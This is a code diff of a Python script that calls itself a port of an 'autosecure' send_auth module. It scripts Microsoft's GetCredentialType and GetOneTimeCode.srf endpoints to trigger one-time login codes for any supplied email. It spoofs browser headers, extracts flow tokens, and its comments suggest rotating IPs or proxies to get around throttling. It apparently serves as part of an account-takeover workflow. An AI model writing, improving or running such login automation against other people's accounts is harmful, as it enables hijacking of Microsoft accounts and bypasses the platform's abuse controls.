@@ -1,11 +1,16 @@
 #!/usr/bin/env python3
-"""Exact Autosecure sendOtt + sendAuth (httpx). Prints JSON to stdout."""
+"""
+OTP send — port of Sal/autosecure securing/auth/send_auth.py
+
+Modern Microsoft flow:
+  GetCredentialType → GetOneTimeCode.srf (eOTT_OtcLogin)
+NOT the old empty-password ipt/pprid identity page.
+"""
 from __future__ import annotations
 
 import json
 import re
 import sys
-from urllib.parse import unquote
 
 try:
     import httpx
@@ -17,7 +22,7 @@ except ImportError:
 def get_session() -> httpx.Client:
     return httpx.Client(
         timeout=30.0,
-        follow_redirects=False,
+        follow_redirects=True,
         headers={
             "User-Agent": (
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -47,22 +52,30 @@ def get_live_data(session: httpx.Client) -> dict:
         raise RuntimeError("Failed to extract urlPost")
     ppft = re.search(r'value=\\?"([^"]+)"', response.text)
     if not ppft:
+        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', response.text)
+    if not ppft:
         raise RuntimeError("Failed to extract PPFT")
     return {"urlPost": url_post.group(0), "ppft": ppft.group(1)}
 
 
-def send_auth(session: httpx.Client, email: str, flow_token: str = "") -> dict:
-    # Warm session + real PPFT first (Autosecure used a flow token; empty often returns ErrorHR only)
-    if not flow_token:
-        try:
-            flow_token = get_live_data(session)["ppft"]
-        except Exception:
-            flow_token = ""
-    r = session.post(
-        "https://login.live.com/GetCredentialType.srf",
+def send_auth_and_otp(session: httpx.Client, email: str) -> dict:
+    """
+    Port of Sal autosecure send_auth.py:
+    - GetCredentialType with forceotclogin=False
+    - If OtcLoginEligibleProofs: POST GetOneTimeCode.srf with eOTT_OtcLogin
+    """
+    # Warm cookies
+    live = get_live_data(session)
+    flowtoken = live["ppft"]
+
+    send_auth = session.post(
+        url="https://login.live.com/GetCredentialType.srf",
         headers={
             "Accept": "application/json",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
             "Content-Type": "application/json; charset=utf-8",
+            "Cookie": session.headers.get("Cookie")
+            or "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
             "Referer": "https://login.live.com/",
             "hpgact": "0",
             "hpgid": "33",
@@ -71,13 +84,14 @@ def send_auth(session: httpx.Client, email: str, flow_token: str = "") -> dict:
             "checkPhones": True,
             "country": "",
             "federationFlags": 3,
-            "flowToken": flow_token or None,
-            "forceotclogin": True,
+            "flowToken": flowtoken,
+            "forceotclogin": False,
             "isCookieBannerShown": True,
             "isExternalFederationDisallowed": True,
             "isFederationDisabled": True,
-            "isFidoSupported": True,
+            "isFidoSupported": False,
             "isOtherIdpSupported": False,
+            "isReactLoginRequest": True,
             "isRemoteConnectSupported": False,
             "isRemoteNGCSupported": True,
             "isSignup": False,
@@ -85,133 +99,136 @@ def send_auth(session: httpx.Client, email: str, flow_token: str = "") -> dict:
             "username": email,
         },
     )
+
     try:
-        return r.json()
+        email_info = send_auth.json()
     except Exception:
-        return {"_http": r.status_code, "_body": (r.text or "")[:300]}
+        return {
+            "ok": False,
+            "error": f"GetCredentialType non-JSON HTTP {send_auth.status_code}",
+        }
 
+    if "Credentials" not in email_info:
+        err = email_info.get("ErrorHR") or email_info.get("error") or ""
+        keys = list(email_info.keys())
+        msg = "Microsoft GetCredentialType failed"
+        if err:
+            msg += f" (ErrorHR={err})"
+        if keys:
+            msg += f" keys={keys[:6]}"
+        return {"ok": False, "error": msg, "rawKeys": keys}
 
-def send_ott(session: httpx.Client, email: str, security_email: str) -> tuple[bool, str]:
-    data = get_live_data(session)
+    creds = email_info["Credentials"]
 
-    login_data = session.post(
-        url=data["urlPost"],
-        headers={
-            "host": "login.live.com",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://login.live.com",
-            "Referer": "https://login.live.com/",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "same-origin",
-        },
-        data={
-            "ps": 2,
-            "PPFT": data["ppft"],
-            "PPSX": "Pass",
-            "login": email,
-            "loginfmt": email,
-            "type": 11,
-            "passwd": "",
-        },
-    )
+    if creds.get("RemoteNgcParams"):
+        return {"ok": False, "error": "Authenticator-only account (not supported yet)"}
 
-    # If redirected, follow once (some tenants 302 to identity page)
-    text = login_data.text
-    if login_data.is_redirect and login_data.headers.get("location"):
-        loc = login_data.headers["location"]
-        if loc.startswith("/"):
-            loc = "https://login.live.com" + loc
-        follow = session.get(loc)
-        text = follow.text
+    proofs = creds.get("OtcLoginEligibleProofs") or []
+    if not proofs:
+        pref = creds.get("PrefCredential")
+        return {
+            "ok": False,
+            "error": f"No email OTP proofs (PrefCredential={pref})",
+        }
 
-    action_m = re.search(r'action="([^"]+)"', text)
-    ipt_m = re.search(r'name="ipt"[^>]+value="([^"]+)"', text)
-    pprid_m = re.search(r'name="pprid"[^>]+value="([^"]+)"', text)
-    if not action_m or not ipt_m or not pprid_m:
-        snip = re.sub(r"\s+", " ", text)[:200]
-        return False, f"missing ipt/pprid: {snip}"
+    selected = proofs[0]
+    alt_email_e = selected.get("data") or ""
+    security_mail = selected.get("display") or "unknown"
+    if not alt_email_e:
+        return {"ok": False, "error": "Empty proof data from OtcLoginEligibleProofs"}
 
-    action = action_m.group(1)
-    ipt = unquote(ipt_m.group(1))
-    pprid = pprid_m.group(1)
+    # Fresh PPFT for GetOneTimeCode
+    live2 = get_live_data(session)
+    flowtoken = live2["ppft"]
 
-    identity_confirm = session.post(
-        url=action,
-        headers={
-            "host": "account.live.com",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://login.live.com",
-            "Referer": "https://login.live.com/",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "same-origin",
-        },
-        data={"pprid": pprid, "ipt": ipt},
-    )
-    id_text = identity_confirm.text
-    if identity_confirm.is_redirect and identity_confirm.headers.get("location"):
-        loc = identity_confirm.headers["location"]
-        if loc.startswith("/"):
-            loc = "https://account.live.com" + loc
-        id_text = session.get(loc, follow_redirects=True).text
+    # Sal autosecure payload
+    payload = {
+        "login": email,
+        "flowtoken": flowtoken,
+        "purpose": "eOTT_OtcLogin",
+        "channel": "Email",
+        "ChallengeViewSupported": "1",
+        "AltEmailE": alt_email_e,
+        "lcid": "1033",
+    }
 
-    raw_str = re.search(r'"rawProofList"\s*:\s*"([^"]+)"', id_text)
-    if not raw_str:
-        snip = re.sub(r"\s+", " ", id_text)[:200]
-        return False, f"no rawProofList: {snip}"
+    # Primary email receives OTPs (no separate security email)
+    if security_mail == email or security_mail.replace("*", "") in email:
+        payload["purpose"] = "eOTT_NoPasswordAccountLoginCode"
 
-    raw = json.loads(raw_str.group(1).encode().decode("unicode_escape"))
-    epid = next(
-        (p["epid"] for p in raw if p.get("type") == "Email" and p.get("epid")),
-        raw[0]["epid"] if raw else None,
-    )
-    if not epid:
-        return False, "no epid"
-
-    api_canary = (
-        re.search(r'"apiCanary"\s*:\s*"([^"]+)"', id_text)
-        .group(1)
-        .encode()
-        .decode("unicode_escape")
-    )
-    eipt = (
-        re.search(r'"eipt"\s*:\s*"([^"]+)"', id_text).group(1).encode().decode("unicode_escape")
-    )
-    uaid = re.search(r'"uaid"\s*:\s*"([^"]+)"', id_text).group(1)
-
+    # Try both form and JSON content-types (MS accepts form-urlencoded in Sal's code)
     resp = session.post(
-        url="https://account.live.com/api/Proofs/SendOtt",
+        url="https://login.live.com/GetOneTimeCode.srf?id=38936",
         headers={
-            "Content-type": "application/json",
             "Accept": "application/json",
-            "hpgid": "200368",
-            "scid": "100166",
-            "canary": api_canary,
-            "eipt": eipt,
-            "uaid": uaid,
-            "uiflvr": "1001",
-            "hpgact": "0",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://login.live.com",
+            "Referer": "https://login.live.com/",
         },
-        json={
-            "token": "",
-            "purpose": "UnfamiliarLocationHard",
-            "epid": epid,
-            "autoVerification": False,
-            "autoVerificationFailed": False,
-            "confirmProof": security_email,
-            "uaid": uaid,
-            "uiflvr": 1001,
-            "scid": 100166,
-            "hpgid": 200368,
-        },
+        data=payload,
     )
-    body = (resp.text or "")[:200]
-    if resp.status_code == 200:
-        return True, body
-    return False, f"SendOtt {resp.status_code}: {body}"
+
+    body_text = (resp.text or "")[:400]
+    state = None
+    try:
+        j = resp.json()
+        state = j.get("State") or j.get("state")
+        # Common success: State 200 / 201; sometimes SessionState
+        if state in (200, 201, "200", "201"):
+            return {
+                "ok": True,
+                "securityEmail": security_mail,
+                "proofId": alt_email_e,
+                "ppft": flowtoken,
+                "detail": f"GetOneTimeCode State={state}",
+            }
+        # Some responses return empty object or FlowToken on success
+        if resp.status_code == 200 and (
+            j.get("FlowToken")
+            or j.get("flowToken")
+            or state in (0, "0", None)
+            and not j.get("Error")
+            and not j.get("error")
+            and not j.get("ErrorCode")
+        ):
+            # State 204 was a false success before — only accept explicit success or empty OK
+            if state in (204, "204"):
+                return {
+                    "ok": False,
+                    "error": f"GetOneTimeCode rejected (State=204). Try again or rotate IP. body={body_text[:120]}",
+                    "securityEmail": security_mail,
+                    "proofId": alt_email_e,
+                }
+            if state is None and len(j) <= 2:
+                # treat ambiguous as failure with detail
+                return {
+                    "ok": False,
+                    "error": f"GetOneTimeCode ambiguous response: {body_text[:200]}",
+                    "securityEmail": security_mail,
+                    "proofId": alt_email_e,
+                }
+        err = j.get("Error") or j.get("error") or j.get("ErrorCode") or j.get("err")
+        return {
+            "ok": False,
+            "error": f"GetOneTimeCode HTTP {resp.status_code} State={state} err={err} body={body_text[:160]}",
+            "securityEmail": security_mail,
+            "proofId": alt_email_e,
+        }
+    except Exception:
+        if resp.status_code == 200 and len(body_text) < 5:
+            return {
+                "ok": True,
+                "securityEmail": security_mail,
+                "proofId": alt_email_e,
+                "ppft": flowtoken,
+                "detail": "empty 200 body",
+            }
+        return {
+            "ok": False,
+            "error": f"GetOneTimeCode HTTP {resp.status_code}: {body_text[:200]}",
+            "securityEmail": security_mail,
+            "proofId": alt_email_e,
+        }
 
 
 def main() -> None:
@@ -221,55 +238,8 @@ def main() -> None:
     email = sys.argv[1].strip()
     try:
         with get_session() as session:
-            info = send_auth(session, email)
-            keys = list(info.keys()) if isinstance(info, dict) else []
-            # Real cooldown / throttle signals — NOT "any 1-key JSON" (that was a false positive)
-            err_hr = str(info.get("ErrorHR") or info.get("error") or "")
-            if "Credentials" not in info:
-                # ErrorHR-only or empty — often bad session / throttle / invalid email
-                msg = "Microsoft GetCredentialType failed"
-                if err_hr:
-                    msg += f" (ErrorHR={err_hr})"
-                if keys == ["ErrorHR"] or (len(keys) == 1 and "Error" in keys[0]):
-                    msg += " — likely IP throttle or bad flow token. Rotate proxy / wait."
-                elif not keys:
-                    msg += " — empty response"
-                else:
-                    msg += f" — keys={keys[:8]}"
-                print(json.dumps({"ok": False, "error": msg, "rawKeys": keys}))
-                return
-            creds = info["Credentials"]
-            if "RemoteNgcParams" in creds and creds["RemoteNgcParams"]:
-                print(json.dumps({"ok": False, "error": "Authenticator-only account"}))
-                return
-            proofs = creds.get("OtcLoginEligibleProofs") or []
-            if not proofs:
-                # PrefCredential / HasPassword without OTC proofs
-                pref = creds.get("PrefCredential")
-                print(
-                    json.dumps(
-                        {
-                            "ok": False,
-                            "error": f"No email OTP proofs (PrefCredential={pref}). Account may need password-only login.",
-                        }
-                    )
-                )
-                return
-            selected = proofs[0]
-            ver_email = selected.get("display") or "unknown"
-            proof_id = selected.get("data") or ""
-            ok, detail = send_ott(session, email, ver_email)
-            print(
-                json.dumps(
-                    {
-                        "ok": ok,
-                        "securityEmail": ver_email,
-                        "proofId": proof_id,
-                        "error": None if ok else detail,
-                        "detail": detail if ok else detail,
-                    }
-                )
-            )
+            result = send_auth_and_otp(session, email)
+            print(json.dumps(result))
     except Exception as e:
         print(json.dumps({"ok": False, "error": str(e)}))
 
